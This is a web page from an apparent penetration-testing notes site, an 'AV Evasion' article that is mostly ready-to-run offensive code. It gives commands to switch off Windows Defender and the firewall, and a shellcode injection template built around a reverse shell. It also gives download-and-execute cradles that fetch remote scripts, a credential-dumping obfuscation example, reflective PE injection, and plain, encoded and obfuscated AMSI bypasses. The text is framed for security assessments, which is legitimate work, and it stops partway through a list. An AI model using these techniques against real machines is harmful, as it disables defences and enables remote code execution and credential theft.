<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>AV Evasion | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="AV Evasion" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware." />
<meta property="og:description" content="Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/post-exploitation/av-evasion/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/post-exploitation/av-evasion/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware.","url":"http://0.0.0.0:4000/hackingnotes/post-exploitation/av-evasion/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"AV Evasion","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item current"><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Post Exploitation</h2>
				<h3>AV Evasion</h3>
			</div>
			<article class="content">
				<p>Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware.</p>

<p>So in order to perform our work properly we need to bypass the AV.</p>

<p>Some interesting websites or programs that will help us to determine if our binary/script is flagged as a malware:</p>

<ul>
  <li><a href="antiscan.me">https://antiscan.me/</a></li>
  <li><a href="AMSITrigger">https://github.com/RythmStick/AMSITrigger</a></li>
  <li><a href="DefenderCheck">https://github.com/matterpreter/DefenderCheck</a></li>
</ul>

<h1 id="deactivate-antivirus-and-firewall">Deactivate Antivirus and Firewall</h1>

<h2 id="antivirus">Antivirus</h2>

<p>Check status:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MpComputerStatus
</code></pre></div></div>

<p>Need <code class="highlighter-rouge">NT AUTHORITY/SYSTEM</code> rights if the UAC is enabled.</p>

<p>Stop Real-time procetions and AMSI:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-MpPreference</span> -DisableRealtimeMonitoring <span class="nv">$true</span>
<span class="nb">Set-MpPreference</span> -DisableIOAVProtection <span class="nv">$true</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop WinDefend
</code></pre></div></div>

<p>If it is not possible <strong>login via RDP with an Administrator user</strong> and disable it manually.</p>

<h2 id="firewall">Firewall</h2>

<p>Disable firewall by executing:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
</code></pre></div></div>

<h1 id="string-replacement">String Replacement</h1>

<p>String Replacement is one of the oldest techniques. Antivirus makes use of signatures, if we replace the name of:</p>

<ul>
  <li>variables</li>
  <li>functions</li>
  <li>more over</li>
</ul>

<p>We can modify the signatures in order to bypass the AV. Read more:</p>

<ul>
  <li><a href="https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/">https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/</a></li>
  <li><a href="https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/">https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/</a></li>
</ul>

<h1 id="obfuscation">Obfuscation</h1>

<p>Obfuscate is the action of amking something obscure, unclear or unintelligible.</p>

<h2 id="invoke-obfuscation">Invoke-Obfuscation</h2>

<p>Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.</p>

<ul>
  <li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
</ul>

<p><img src="/hackingnotes/images/invoke-obfuscation.png" alt="Invoke-Obfuscation" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

set SCRIPTBLOCK "iex (New-Object System.Net.Webclient).DownloadString('http://localhost/script.ps1);Invoke-Kapokatz.ps1 -DumpCreds"

ENCODING

5

Result:
inVoKe-EXPRESSiOn ( ([rUNTiME.iNteRopsERViCEs.marshAl]::ptRTosTriNGaUto( [RuNtIMe.InteRopSErviCEs.marshaL]::seCuREsTrinGtobsTr($('76492d1116743f0423413b16050a5345MgB8AC8AagB1AEwAbQBnAGEAcgBSAE0AUQBSADYAWQA1AHIAeQBPAHEATwBQAEEAPQA9AHwAOABlAGUAYQBmAGUAZQBjAGYAOAA5AGEAMAAxADMAYQA1ADcAMQA3AGYAZgA0ADQAMQA3AGIAMAA1ADAANwBjAGUAMwBiAGQANAAwAGYAMQAyADQANQBkAGEAZABmADcANAAwADgAYgBjAGMANAA3AGYAMQA1ADAANgBjADAANgBmADEAYwA4ADEANABlAGEANQA4ADAANABkADgAYwA4ADIAOAA3AGMAMABkAGMAYwBlAGEAYwA3AGQAMwA4ADcAMAAzADQAYgA2AGQAOAA0ADYAYQAwADIAZABiADQAYQA1ADEAZgBlAGMANgBmAGYAOAA4ADMAMABlAGQAMwA1AGIAZAA1AGEAMwA4ADkAYgAyADAANgAyAGEAYQAzADcAMQBhADUAYQBmAGQAOAAwADcAOQA0AGUAZgA1ADYANQA3AGQAZgAzADIAMgBhAGUAMAA2ADAAYgAxADgAYwBhAGUAYwBjAGUAMABlADMAZABkADYAMAAxADYAZQA0ADcANABiADAAZgA4ADEAYQA0AGEAZgA5ADQANAAwADcAOQBlADkAMgAyADcAZgBiAGEAZQBkADkAMAA0AGUAOQA3ADEAMwAwAGIANgAzADgANwBmADgANQAzAGQANQBiAGEANwBmAGMANQAzAGIAYwBlADYAOABlADgANwA2ADcAZQA0AGYANQBiADMAMwBkAGIAOQA1ADQAMgA5ADYAOAA5ADgANgBmADEANgAxADIAMwBjAGMAOABhADAAZQAwADEAOABlAGUAMAA5ADEAMgBjAG')))))
</code></pre></div></div>
<h2 id="invoke-cradlecrafter">Invoke-CradleCrafter</h2>

<p><code class="highlighter-rouge">Invoke-CradleCrafter</code> is very useful for implementing obfuscation.</p>

<ul>
  <li><a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a></li>
</ul>

<p>More info in :</p>

<ul>
  <li><a href="https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-cradlecrafter-overview">https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-cradlecrafter-overview</a></li>
</ul>

<h1 id="in-memory-injection">In-Memory Injection</h1>

<h2 id="template">Template</h2>

<p>A basic template script that performs in-memory injection:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$code</span> <span class="o">=</span> <span class="s1">'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);'</span>;
<span class="nv">$winFunc</span> <span class="o">=</span> <span class="nb">Add-Type</span> -memberDefinition <span class="nv">$code</span> -Name <span class="s2">"Win32"</span> -namespace Win32Functions -passthru;

<span class="o">[</span><span class="kt">Byte</span><span class="o">[]]</span>;
<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip_addr&gt; LPORT=&lt;port&gt; -f powershell</span>
<span class="o">[</span><span class="kt">Byte</span><span class="o">[]]</span><span class="nv">$sc</span> <span class="o">=</span> &lt;place your shellcode here&gt;;

<span class="nv">$size</span> <span class="o">=</span> 0x1000;

<span class="k">if</span> <span class="o">(</span><span class="nv">$sc</span>.Length -gt 0x1000<span class="o">)</span> <span class="o">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$sc</span>.Length<span class="o">}</span>;

<span class="nv">$x</span> <span class="o">=</span> <span class="nv">$winFunc</span>::VirtualAlloc<span class="o">(</span>0,<span class="nv">$size</span>,0x3000,0x40<span class="o">)</span>;

<span class="k">for</span> <span class="o">(</span><span class="nv">$i</span><span class="o">=</span>0;<span class="nv">$i</span> -le <span class="o">(</span><span class="nv">$sc</span>.Length-1<span class="o">)</span>;<span class="nv">$i</span>++<span class="o">)</span> <span class="o">{</span><span class="nv">$winFunc</span>::memset<span class="o">([</span>IntPtr]<span class="o">(</span><span class="nv">$x</span>.ToInt32<span class="o">()</span>+<span class="nv">$i</span><span class="o">)</span>, <span class="nv">$sc</span><span class="o">[</span><span class="nv">$i</span><span class="o">]</span>, 1<span class="o">)}</span>;

<span class="nv">$winFunc</span>::CreateThread<span class="o">(</span>0,0,<span class="nv">$x</span>,0,0,0<span class="o">)</span>;<span class="k">for</span> <span class="o">(</span>;;<span class="o">)</span> <span class="o">{</span> <span class="nb">Start-sleep </span>60 <span class="o">}</span>;
</code></pre></div></div>

<h2 id="powershell-scripts">Powershell Scripts</h2>

<p>We can download and execute a script without saving it on disk. This is a powerful tool because we prevent the antivirus from scanning our file.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">iex</span> <span class="o">(</span><span class="nb">New-Object </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://ip-addr:port/file.ps1'</span><span class="o">)</span>
<span class="nb">iex</span> <span class="o">(</span><span class="nb">iwr</span> <span class="s1">'http://ip-addr:port/file.ps1'</span><span class="o">)</span>
</code></pre></div></div>

<p>Since this technique was appear, windows implemented the <code class="highlighter-rouge">AMSI (Antimalware Scan Interface)</code> as a method to defend from malware during execution. So we need to bypass it.</p>

<h3 id="invoke-reflectivepeinjectionps1">Invoke-ReflectivePEInjection.ps1</h3>

<p>With <code class="highlighter-rouge">Invoke-ReflectivePEInjection.ps1</code> from <code class="highlighter-rouge">PowerSploit</code> we can convert a <code class="highlighter-rouge">dll</code> or <code class="highlighter-rouge">exe</code> binary to a PowerShell script.</p>

<ul>
  <li><a href="https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/">https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/</a></li>
</ul>

<p>We just need to convert our exe to base64 in order to hardcode it in a PowerShell script.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$PEBytes</span> <span class="o">=</span> <span class="o">[</span>IO.File]::ReadAllBytes<span class="o">(</span><span class="s1">'C:\Windows\Temp\binary.exe'</span><span class="o">)</span>
<span class="nv">$b64</span> <span class="o">=</span> <span class="o">[</span>System.Convert]::ToBase64String<span class="o">(</span><span class="nv">$PEBytes</span><span class="o">)</span>
</code></pre></div></div>

<p>Finally we just need to append the following code in the <code class="highlighter-rouge">Invoke-ReflectivePEInjection.ps1</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$b64</span> <span class="o">=</span>  <span class="s2">"BASE64-BINARY-CHANGEME"</span>
<span class="nv">$PEBytes</span> <span class="o">=</span> <span class="o">[</span>System.Convert]::FromBase64String<span class="o">(</span><span class="nv">$b64</span><span class="o">)</span>
Invoke-ReflectivePEInjection -PEBytes <span class="nv">$PEBytes</span> -ExeArgs <span class="s2">"Arg1 Arg2 Arg3"</span>
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: Sometimes arguments doesn’t work so maybe you need to harcode the arguments on the binary and recompile it.</p>

  <p>Example of hardcoding arguments on PrintSpoofer (c++):</p>

  <p><code class="highlighter-rouge">BOOL g_bInteractWithConsole FALSE;</code>
<code class="highlighter-rouge">wchar_t commad[] = L"cmd.exe";</code>
<code class="highlighter-rouge">LPWSTR g_pwszCommandLine = command;</code></p>

</blockquote>

<p>If and error like that occurs <code class="highlighter-rouge">Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."</code></p>

<p>Try to replace the following line:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
</code></pre></div></div>
<p>To:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
</code></pre></div></div>
<h1 id="amsi-bypass">AMSI bypass</h1>

<p>Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code.</p>

<p>When a user executes a script or initiates PowerShell, the <code class="highlighter-rouge">AMSI.dll</code> is injected into the process memory space. These two API’s are used by the AV to scan the buffer and strings searching signatures from malware.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AmsiScanBuffer()
AmsiScanString()
</code></pre></div></div>

<p>If a known signature is identified during execution does not initate and a message appears that the script has been blocked during execution by the antivirus.</p>

<p><img src="/hackingnotes/images/amsi.png" alt="AMSI" /></p>

<p>Even though some of the techniques in their original state are blocked, modification of strings, variables and functions, encoding and obfuscation could revive even the oldest tactics.</p>

<h2 id="powershell-downgrade">PowerShell Downgrade</h2>

<p>Even though that Windows PowerShell 2.0 is deprecated, in some devices it hasn’t been removed. Older versions of PowerShell does not contain security controls such as AMSI.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -version 2
</code></pre></div></div>

<h2 id="set-amsiinitfailed-flag">Set “amsiInitFailed” flag</h2>

<p>Setting the <code class="highlighter-rouge">amsiInitFailed</code> flag prevents the AMSI scanning capability for the current process:</p>

<ul>
  <li>Original Payload:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s1">'amsiInitFailed'</span>,<span class="s1">'NonPublic,Static'</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>,<span class="nv">$true</span><span class="o">)</span>
</code></pre></div>    </div>
  </li>
  <li>Base64 Encoded Payload:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Ref].Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.'</span>+<span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'QQBtAHMAaQBVAHQAaQBsAHMA'</span><span class="k">)</span><span class="o">)))</span>.GetField<span class="o">(</span><span class="k">$(</span><span class="o">[</span>Text.Encoding]::Unicode.GetString<span class="o">([</span>Convert]::FromBase64String<span class="o">(</span><span class="s1">'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='</span><span class="k">)</span><span class="o">))</span>,<span class="s1">'NonPublic,Static'</span><span class="o">)</span>.SetValue<span class="o">(</span><span class="nv">$null</span>,<span class="nv">$true</span><span class="o">)</span>
</code></pre></div>    </div>
  </li>
  <li>Obfuscated Payload:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sET-ItEM</span> <span class="o">(</span> <span class="s1">'V'</span>+<span class="s1">'aR'</span> + <span class="s1">'IA'</span> + <span class="s1">'blE:1q2'</span> + <span class="s1">'uZx'</span> <span class="o">)</span> <span class="o">(</span> <span class="o">[</span><span class="nb">TYpE</span><span class="o">](</span> <span class="s2">"{1}{0}"</span>-F<span class="s1">'F'</span>,<span class="s1">'rE'</span> <span class="o">)</span> <span class="o">)</span> ; <span class="o">(</span> <span class="nb">GeT-VariaBle</span> <span class="o">(</span> <span class="s2">"1Q2U"</span> +<span class="s2">"zX"</span> <span class="o">)</span> -VaL <span class="o">)</span>.<span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span>.<span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="o">((</span> <span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span> -f<span class="s1">'Util'</span>,<span class="s1">'A'</span>,<span class="s1">'Amsi'</span>,<span class="s1">'.Management.'</span>,<span class="s1">'utomation.'</span>,<span class="s1">'s'</span>,<span class="s1">'System'</span> <span class="o">)</span> <span class="o">)</span>.<span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="o">(</span> <span class="o">(</span> <span class="s2">"{0}{2}{1}"</span> -f<span class="s1">'amsi'</span>,<span class="s1">'d'</span>,<span class="s1">'InitFaile'</span> <span class="o">)</span>,<span class="o">(</span> <span class="s2">"{2}{4}{0}{1}{3}"</span> -f <span class="s1">'Stat'</span>,<span class="s1">'i'</span>,<span class="s1">'NonPubli'</span>,<span class="s1">'c'</span>,<span class="s1">'c,'</span> <span class="o">))</span>.<span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="o">(</span> <span class="k">${</span><span class="nv">n</span><span class="se">`U</span><span class="nv">Ll</span><span class="k">}</span>,<span class="k">${</span><span class="nv">t</span><span class="se">`R</span><span class="nv">uE</span><span class="k">}</span> <span class="o">)</span>
</code></pre></div>    </div>
